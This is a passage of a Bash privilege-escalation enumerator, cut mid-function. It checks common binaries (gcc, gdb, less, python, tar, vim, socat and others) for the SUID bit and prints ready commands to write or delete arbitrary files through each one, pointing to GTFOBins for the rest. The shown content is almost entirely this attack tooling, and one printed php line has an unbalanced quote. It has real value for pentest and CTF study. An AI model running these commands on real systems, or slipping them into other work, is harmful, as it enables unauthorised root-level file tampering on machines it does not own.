    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'gcc\' has its SUID bit turned on. Delete any file using the following sequence of commands:\nLFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\e[0m'
        fi
    fi

    binary=$(command -v gdb)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'gdb\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\ngdb -nx -ex "dump value $LFILE \\"DATA\\"" -ex quit\e[0m'
        fi
    fi

    binary=$(command -v gimp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'gimp\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/gimp/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gtester)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'gtester\' has its SUID bit turned on. Write to any file using the following sequence of commands (Output is an XML attribute):\nLFILE=file_to_write\ngtester "DATA" -o $LFILE\e[0m'
        fi
    fi

    binary=$(command -v iconv)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'iconv\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/iconv/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v irb)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'irb\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/irb/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v jjs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'jjs\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/jjs/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v jrunscript)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'jrunscript\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/jrunscript/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v ksh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ksh\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ksh/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v less)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'less\' has its SUID bit turned on. Write to any file using the following sequence of commands:\necho DATA | less\ns\nfile_to_write\nq\e[0m'
        fi
    fi

    binary=$(command -v ltrace)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ltrace\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\e[0m'
        fi
    fi

    binary=$(command -v lua)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'lua\' has its SUID bit turned on. Write to any file using the following command:\nlua -e \'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);\'\e[0m'
        fi
    fi

    binary=$(command -v lwp-download)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'lwp-download\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/lwp-download/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v make)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'make\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nmake -s --eval="\$(file >$LFILE,DATA)" .\e[0m'
        fi
    fi

    binary=$(command -v mawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'mawk\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nmawk -v LFILE=$LFILE \'BEGIN { print "DATA" > LFILE }\'\e[0m'
        fi
    fi

    binary=$(command -v nano)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'nano\' has its SUID bit turned on. Write to any file using the following command:\nnano file_to_write\e[0m'
        fi
    fi

    binary=$(command -v nawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'nawk\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nnawk -v LFILE=$LFILE \'BEGIN { print "DATA" > LFILE }\'\e[0m'
        fi
    fi

    binary=$(command -v nmap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'nmap\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nTF=$(mktemp)\necho \'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);\' > $TF\nnmap --script=$TF\nOR display regular nmap output:\nLFILE=file_to_write\nnmap -oG=$LFILE DATA\e[0m'
        fi
    fi

    binary=$(command -v node)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'node\' has its SUID bit turned on. Write to any file using the following command:\nnode -e \'require("fs").writeFileSync("file_to_write", "DATA")\'\e[0m'
        fi
    fi

    binary=$(command -v octave)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'octave\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/octave/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v openssl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'openssl\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho DATA | openssl enc -out "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v pandoc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'pandoc\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho DATA | pandoc -t plain -o "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v php)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'php\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nexport LFILE=file_to_write\nphp -r \'file_put_contents(getenv("LFILE"), "DATA);\'\e[0m'
        fi
    fi

    binary=$(command -v pico)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'pico\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/pico/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v pip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'pip\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/pip/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v puppet)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'puppet\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/puppet/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v python)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'python\' has its SUID bit turned on. Write to any file using the following command:\npython -c \'open("file_to_write","w+").write("DATA")\'\e[0m'
        fi
    fi

    binary=$(command -v red)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'red\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/red/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v redis)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'redis\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/redis/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rlwrap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'rlwrap\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nrlwrap -l "$LFILE" echo DATA\e[0m'
        fi
    fi

    binary=$(command -v ruby)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ruby\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ruby/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v run-mailcap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'run-mailcap\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/run-mailcap/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rview)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'rview\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nrview file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v rvim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'rvim\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nrvim file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v screen)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'screen\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/screen/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v script)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'script\' has its SUID bit turned on. Write to any file using the following command:\nscript -q -c \'echo DATA\' file_to_write\e[0m'
        fi
    fi

    binary=$(command -v sed)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'sed\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/sed/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v shuf)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'shuf\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nshuf -e DATA -o "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v socat)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'socat\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nsocat -u \'exec:echo DATA\' "open:$LFILE,creat"\e[0m'
        fi
    fi

    binary=$(command -v split)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'split\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/split/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v sqlite3)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'sqlite3\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nsqlite3 /dev/null -cmd ".output $LFILE" \'select "DATA";\'\e[0m'
        fi
    fi

    binary=$(command -v strace)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'strace\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/strace/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v tar)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'tar\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > "$TF"\ntar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P\e[0m'
        fi
    fi

    binary=$(command -v tee)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'tee\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho DATA | tee -a "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v vi)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'vi\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nvi file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v view)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'view\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nview file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v vim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'vim\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nvim file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v vimdiff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'vimdiff\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nvimdiff file_to_write\ni\nDATA\n^[\n:w!\n:qa\e[0m'
        fi
    fi

    binary=$(command -v virsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'virsh\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/virsh/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v wget)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'wget\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE\e[0m'
        fi
    fi

    binary=$(command -v xxd)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'xxd\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho DATA | xxd | xxd -r - "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v zsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'zsh\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nexport LFILE=file_to_write\nzsh -c \'echo DATA > $LFILE\'\e[0m'
        fi
    fi

    if [[ $writeVulnerableFound -eq 0 ]]; then
        echo $'\n\e[33mNo file write vulnerabilities found.'
    fi

}

function command_exploit {
    commandVulnerableFound=0

    echo $'\n\n\e[1m\e[4m\e[35mCOMMAND VULNERABILITIES\e[0m'

    binary=$(command -v aria2c)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'aria2c\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/aria2c/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v at)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'at\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/at/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v check_ssl_cert)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'check_ssl_cert\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/check_ssl_cert/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v crash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'crash\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/crash/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v crontab)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'crontab\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/crontab/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v nohup)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'nohup\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/nohup/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v php)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'php\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/php/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v pidstat)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'pidstat\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/pidstat/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v sed)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
